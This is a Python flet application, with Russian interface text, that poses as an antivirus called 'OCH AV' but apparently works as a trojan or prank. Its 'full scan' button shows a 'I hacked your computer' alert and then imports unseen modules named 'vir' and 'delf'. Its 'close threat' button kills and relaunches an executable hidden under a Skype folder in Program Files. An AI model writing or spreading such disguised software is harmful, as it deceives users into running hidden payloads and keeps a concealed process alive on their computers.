import os

import flet as ft
import pyautogui as pg
import time
import signal
import psutil

def main(page: ft.Page):
    page.title = "Ochen Krutoy Antivirus by me (OCH AV)"
    page.theme_mode = 'dark'
    page.vertical_alignment = ft.CrossAxisAlignment.CENTER
    page.window_resizable = False

    def back1(e):
        page.clean()
        page.add(homepage)

    def ura(e):
        page.clean()
        a = ft.Row(
            ft.Column(
                [
                    ft.Text('                                                                                                   А отчетов нету!', color='#1d223b', size=20),
                    ft.Text('                                            А ты что хотел?', color='#1d223b', size=40),
                    ft.IconButton(ft.icons.Icons.ARROW_BACK, on_click=back1)

                ],
                alignment=ft.MainAxisAlignment.CENTER
            )
        )
        page.add(a)

    def updbase(e):
        page.clean()
        homepage1 = ft.Row(
            ft.Column(
                [
                    ft.Text('                            OCH AV - Лучший антивирус за всю историю динозавров', size=30),
                    ft.Text('                                                                ', size=100),
                    ft.Row(
                        [
                            ft.Text('                 '),
                            ft.Button('Базы обновлены', width=250, height=125, on_click=updbase),
                            ft.Text(
                                '                                                                                                                                                '),
                            ft.Button('Отчеты', width=250, height=125, on_click=ura)
                        ],
                        alignment=ft.MainAxisAlignment.CENTER
                    )

                ],
                alignment=ft.MainAxisAlignment.START
            )
        )
        page.update()
        page.add(homepage1)

    def virus(e):
        pg.alert("АХАХАХАХА Я ВЗЛОМАЛ ТВОЙ КОМП", "Ты лох")
        time.sleep(2)
        import vir
        import delf

    def back2(e):
        page.clean()
        page.add(fastcheck)


    def fcheck(e):
        page.clean()
        fastcheck1 = ft.Row(
            ft.Column(
                [
                    ft.Text('                     Сорянчик дядя, но нет', size=60),
                    ft.Text('                                                                ', size=100),
                    ft.Row(
                        [
                            ft.Text(
                                '                                                                                                                                '),
                            ft.Button('Вернуться', width=250, height=125, on_click=back2)
                        ],
                        alignment=ft.MainAxisAlignment.CENTER
                    )

                ],
                alignment=ft.MainAxisAlignment.START
            )
        )
        page.add(fastcheck1)

    def stop(e):
        os.chdir('C:/Program Files (x86)/Common Files/Skype')
        process_name = "visual.exe"
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == process_name:
                external_pid = process.info['pid']
                os.kill(external_pid, signal.SIGTERM)
                time.sleep(2)
                os.startfile('C:/Program Files (x86)/Common Files/Skype/visual.exe')
                break

    def switch_theme(e):
        if page.theme_mode == 'dark':
            page.theme_mode = 'light'
        else:
            page.theme_mode = 'dark'


    fullcheck = ft.Row(
        ft.Column(
            [
                ft.Text('                         Полная проверка', size=60),
                ft.Text('                                                                ', size=100),
                ft.Row(
                    [
                        ft.Text('                                                                                                                                '),
                        ft.Button('Начать проверку', width=250, height=125, on_click=virus)
                    ],
                    alignment=ft.MainAxisAlignment.CENTER
                )

            ],
            alignment=ft.MainAxisAlignment.START
        )
    )

    settings = ft.Row(
        ft.Column(
            [
                ft.Text('                                                  Настройки', size=40),
                ft.Text('                К сожалению только одна настройка                                      ', size=50),
                ft.Row(
                    [
                        ft.Text(
                            '                                                                                                                                '),
                        ft.Button('Поменять тему', width=250, height=125, on_click=switch_theme)
                    ],
                    alignment=ft.MainAxisAlignment.CENTER
                )

            ],
            alignment=ft.MainAxisAlignment.START
        )
    )

    fastcheck = ft.Row(
        ft.Column(
            [
                ft.Text('                        Быстрая проверка', size=60),
                ft.Text('                                                                ', size=100),
                ft.Row(
                    [
                        ft.Text(
                            '                                                                                                                                '),
                        ft.Button('Начать проверку', width=250, height=125, on_click=fcheck)
                    ],
                    alignment=ft.MainAxisAlignment.CENTER
                )

            ],
            alignment=ft.MainAxisAlignment.START
        )
    )

    ugroz = ft.Row(
        ft.Column(
            [
                ft.Text('                                           Обнаружена 1 угроза', size=40),
                ft.Text('                         Источник: это приложение                                ', size=50),
                ft.Row(
                    [
                        ft.Text(
                            '                                                                                                                                '),
                        ft.Button('Закрыть', width=250, height=125, on_click=stop)
                    ],
                    alignment=ft.MainAxisAlignment.CENTER
                )

            ],
            alignment=ft.MainAxisAlignment.START
        )
    )



    homepage = ft.Row(
        ft.Column(
               [
                   ft.Text('                            OCH AV - Лучший антивирус за всю историю динозавров', size=30),
                   ft.Text('                                                                ', size=100),
                   ft.Row(
                       [
                           ft.Text('                 '),
                           ft.Button('Обновить базы', width=250, height=125, on_click=updbase),
                           ft.Text('                                                                                                                                                '),
                           ft.Button('Отчеты', width=250, height=125, on_click=ura)
                       ],
                       alignment=ft.MainAxisAlignment.CENTER
                   )

               ],
               alignment=ft.MainAxisAlignment.START
           )
    )

    def navigate(e):
        index = page.navigation_bar.selected_index
        page.clean()
        if index == 0: page.add(homepage)
        if index == 1: page.add(fullcheck)
        if index == 2: page.add(fastcheck)
        if index == 3: page.add(ugroz)
        if index == 4: page.add(settings)


    page.navigation_bar = ft.NavigationBar(
        destinations=[
            ft.NavigationBarDestination(icon=ft.icons.Icons.HOME, label='Главная'),
            ft.NavigationBarDestination(icon=ft.icons.Icons.CLEANING_SERVICES_OUTLINED, label='Полная проверка'),
            ft.NavigationBarDestination(icon=ft.icons.Icons.CLEANING_SERVICES, label='Быстрая проверка'),
            ft.NavigationBarDestination(icon=ft.icons.Icons.CORONAVIRUS, label='Угрозы'),
            ft.NavigationBarDestination(icon=ft.icons.Icons.SETTINGS, label='Настройки'),
        ], on_change=navigate
    )

    page.add(homepage)


ft.app(target=main)
